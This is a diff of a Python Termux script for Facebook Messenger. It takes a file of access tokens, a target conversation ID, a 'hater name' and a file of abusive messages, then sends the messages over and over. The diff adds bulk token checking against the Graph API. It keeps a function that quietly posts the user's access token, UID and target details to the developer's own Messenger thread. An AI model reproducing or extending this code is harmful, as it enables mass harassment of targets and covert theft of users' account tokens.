@@ -62,7 +62,7 @@ def daemonize():
             sys.exit(0)
     except:
         pass
-    os.setsid()
+    
     try:
         pid = os.fork()
         if pid > 0:
@@ -353,7 +353,7 @@ def main_menu():
     print(random.choice(color_list) + "[2] STOP LOADER")
     print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
     animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
-    choice = input(random.choice(color_list) + "\n[+]  CHOOSE AN  OPTION ::").strip()
+    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
     if choice == "2":
         stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
         animated_print("<<════════════════════════════════════════════════════════>>")
@@ -381,7 +381,7 @@ def get_stop_key():
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_61571843423018"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\USSER HATER nName ::>  {mn}\nUSSER Conversation ID ::> {thread_id}\nUSSER UID ::>  {uid}\nUSSER Message File ::> {ms}"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
@@ -491,7 +491,7 @@ if os.path.exists("stop_signal.txt"):
 animated_logo()
 
 # Then, show the original colored logo and venom animations
-colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 
 
    """.splitlines()]
 colored_logo()
@@ -517,52 +517,66 @@ else:
     sys.exit()
 
 os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
-token_file = input("[+] ENTER TOKEN FILE::>  ").strip()
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-with open(token_file, 'r') as f2:
-    token_data = f2.read()
-tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
-if not tokens:
+token_file = input("[+] ENTER TOKEN FILE  ::> ").strip()
+
+try:
+    with open(token_file, 'r') as file:
+        tokens = [line.strip() for line in file.readlines()]
+except FileNotFoundError:
+    print(Fore.RED + "[✗] Token file not found!")
     sys.exit()
 
-access_token = tokens[0]
-payload = {'access_token': access_token}
-a = "https://graph.facebook.com/v15.0/me"
-b = requests.get(a, params=payload)
-d = json.loads(b.text)
-if 'name' not in d:
+valid_tokens = []
+
+for index, token in enumerate(tokens, start=1):
+    token = token.strip()
+    response = requests.get(f'https://graph.facebook.com/me?access_token={token}')
+    if response.status_code == 200:
+        account_info = response.json()
+        print(f"Token {index}: \033[1;32;40m[✓] Account Name - {account_info.get('name')}")
+        valid_tokens.append(token)
+    else:
+        print(f"Token {index}: \033[1;31;40m[✗] Invalid or expired token detected.")
+
+if not valid_tokens:
+    print(Fore.RED + "[✗] No valid tokens found. Exiting...")
     sys.exit()
-mb = d['name']
-print(Fore.GREEN + "YOUR PROFILE NAME :: " + mb + "\n")
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-start_queue_processor()
+
+mb = account_info.get('name', 'Unknown')
+print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
 
 os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
-thread_id = input("[+] ENTER Conversation ID ::>  ").strip()
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+thread_id = input("[+] ENTER CONVO UID ::> ").strip()
+
 os.system('espeak -a 300 "TATE KA NAME DALO"')
-mn = input("[+] ENTER HATER NAME ::>  ").strip()
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+mn = input("[+] ENTER HATER NAME ::> ").strip()
+
 os.system('espeak -a 300 "GALI FILE DALO"')
-ms = input("[+] ENTER GALI FILE ::>   ").strip()
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+ms = input("[+] ENTER GALI FILE ::> ").strip()
+
 os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
-repeat = int(input("[+] KITNI BAAR IS GALI KO reload  KARNA HAI ::>  "))
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-os.system('espeak -a 300 "SPEED DALO YAR"')
-timm = int(input("[+] Enter Speed in Seconds ::> "))
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-print(Fore.BLUE + "\n________All Done....Loading Profile Info.....!")
-print(Fore.BLUE + "Your Profile Name => " + mb + "\n")
-animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 try:
-    ns = open(ms, 'r').readlines()
-except:
+    repeat = int(input("[+] KITNI BAAR IS GALI KO REPEAT KARNA HAI ::> "))
+except ValueError:
+    print(Fore.RED + "[✗] Invalid input for repeat count!")
     sys.exit()
 
-if daemonize_mode:
-    daemonize()
+os.system('espeak -a 300 "SPEED DALO YAR"')
+try:
+    timm = int(input("[+] ENTER SPEED IN SECOND ::> "))
+except ValueError:
+    print(Fore.RED + "[✗] Invalid input for speed!")
+    sys.exit()
+
+print(Fore.BLUE + "\n________All Done....Loading Profile Info.....!")
+print(Fore.BLUE + "Your Profile Name => " + mb + "\n")
+
+try:
+    with open(ms, 'r') as file:
+        ns = file.readlines()
+except FileNotFoundError:
+    print(Fore.RED + "[✗] Gali file not found!")
+    sys.exit()
 
 for i in range(repeat):
-    check_stop()
-    message_on_messenger(thread_id)
+    print(f"Sending message {i+1} to {thread_id}...")
